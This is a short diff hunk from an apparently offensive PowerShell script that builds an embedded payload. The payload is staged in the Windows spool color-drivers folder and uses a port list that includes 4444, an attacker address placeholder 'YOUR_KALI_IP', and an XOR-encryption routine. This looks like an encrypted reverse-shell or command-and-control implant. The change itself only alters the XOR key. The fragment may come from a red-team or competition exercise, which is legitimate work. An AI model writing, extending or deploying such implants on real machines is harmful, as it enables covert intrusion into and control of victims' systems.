@@ -3,7 +3,7 @@ $dir = "C:\Windows\System32\spool\drivers\color"
 $payload = @'
 $ports  = @(80, 443, 8080, 3306, 4444, 5985, 8443)
 $ip     = "YOUR_KALI_IP"
-$xorKey = "C0ldW4r$2026!xK"
+$xorKey = "CDTC0ldW4r$2026!xK"
 
 function XorCrypt([byte[]]$data, [string]$key) {
     $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
